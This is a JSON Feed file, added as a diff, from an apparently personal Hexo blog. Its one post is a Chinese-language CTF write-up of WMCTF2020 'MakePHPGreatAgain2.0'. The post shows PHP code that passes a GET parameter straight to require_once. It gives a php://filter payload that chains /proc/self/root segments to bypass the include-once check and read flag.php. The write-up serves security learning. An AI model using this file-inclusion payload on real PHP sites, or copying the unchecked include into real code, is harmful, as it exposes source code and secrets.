@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"require_once函数\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/09/06/WMCTF2020-MakePHPGreatAgain2-0/",
+            "url": "http://odiws.github.io/2024/09/06/WMCTF2020-MakePHPGreatAgain2-0/",
+            "title": "[WMCTF2020]MakePHPGreatAgain2.0",
+            "date_published": "2024-09-06T12:04:32.000Z",
+            "content_html": "<h2 id=\"wmctf2020makephpgreatagain20\"><a class=\"markdownIt-Anchor\" href=\"#wmctf2020makephpgreatagain20\">#</a> [WMCTF2020]MakePHPGreatAgain2.0</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">require_once</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里有个 require_once () 函数需要了解一下，如果 require_once 包含过一次 flag.php 再次出现则不会执行</p>\n<p>发现 require 文件时，在对<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkQlQUYlRTklOTMlQkUlRTYlOEUlQTUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">软链接</span>的操作上存在一些缺陷，似乎并不会进行多次解析获取真实路径。</p>\n<p>/proc/self 指向当前进程的 /proc/pid/<br>\n/proc/self/root/ 是指向 / 的符号链接</p>\n<p>使用伪协议来读取 flag, 构造 payload:</p>\n<pre><code>?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n</code></pre>\n<p>参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pZ28xMzQvYXJ0aWNsZS9kZXRhaWxzLzEyNTM0MjE4Mg==\">https://blog.csdn.net/nigo134/article/details/125342182</span></p>\n",
+            "tags": [
+                "buuctf",
+                "require_once函数"
+            ]
+        }
+    ]
+}
